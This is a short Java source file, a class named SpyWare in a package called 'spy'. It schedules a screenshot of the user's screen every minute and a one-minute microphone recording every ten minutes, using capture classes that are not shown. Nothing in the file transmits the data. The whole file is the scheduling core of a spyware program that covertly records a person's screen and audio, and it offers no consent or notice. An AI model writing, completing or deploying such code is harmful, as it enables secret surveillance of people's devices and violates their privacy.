package spy;

import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class SpyWare {

    private static final long RECORD_TIME = 60000;

    public static void main(String[] args) {
        scheduledSpyWork();
    }

    public static void recorderThread() {
        AudioRecorder audioRecorder = new AudioRecorder();
        Runnable runnable = () -> audioRecorder.stopRecordingAudio(RECORD_TIME);
        Thread stopper = new Thread(runnable);
        stopper.start();
        audioRecorder.startRecording();
    }

    public static void scheduledSpyWork() {
        Runnable screenshotRunnable = Screenshot::captureScreen;
        Runnable recorderRunnable = SpyWare::recorderThread;

        ScheduledThreadPoolExecutor scheduledThreadPoolExecutor =
                new ScheduledThreadPoolExecutor(2);

        scheduledThreadPoolExecutor.scheduleWithFixedDelay(
                screenshotRunnable, 0,1, TimeUnit.MINUTES
        );

        scheduledThreadPoolExecutor.scheduleWithFixedDelay(
                recorderRunnable, 0, 10, TimeUnit.MINUTES
        );
    }
}
